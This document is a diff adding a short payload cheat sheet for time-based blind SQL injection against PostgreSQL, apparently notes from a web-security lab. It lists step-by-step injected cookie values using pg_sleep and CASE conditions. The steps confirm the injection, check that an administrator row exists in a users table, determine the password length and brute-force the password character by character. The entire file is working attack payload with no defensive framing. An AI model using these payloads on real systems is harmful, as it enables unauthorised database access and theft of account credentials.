@@ -1,0 +1,27 @@
+
+[ WEB > SQLI > POSTGRES > BLIND TIME ]
+
+// Test time-based blind in postgresql...
+// Response should take about 10 seconds...
+Cookie: TrackingId=fnLy6tqabAWG9gIn'||pg_sleep(10)--
+
+// Verify conditional time delay...
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (1=1) then pg_sleep(10) else pg_sleep(0) end--
+
+// Verify no time delay...
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (1=2) then pg_sleep(10) else pg_sleep(0) end--
+
+// See if row exists...
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (username = 'administrator') then pg_sleep(10) else pg_sleep(0) end from users--
+
+// Check pass length... > value
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (username = 'administrator' and length(password)>1) then pg_sleep(10) else pg_sleep(0) end from users--
+
+// Confirm exact pass length.
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (username = 'administrator' and length(password)=20) then pg_sleep(10) else pg_sleep(0) end from users--
+
+// Brute force password...
+Cookie: TrackingId=hgsUkaEzo8urBI4A'%3B select case when (username = 'administrator' and substring(password, 1, 1)='a') then pg_sleep(10) else pg_sleep(0) end from users--
+
+
+
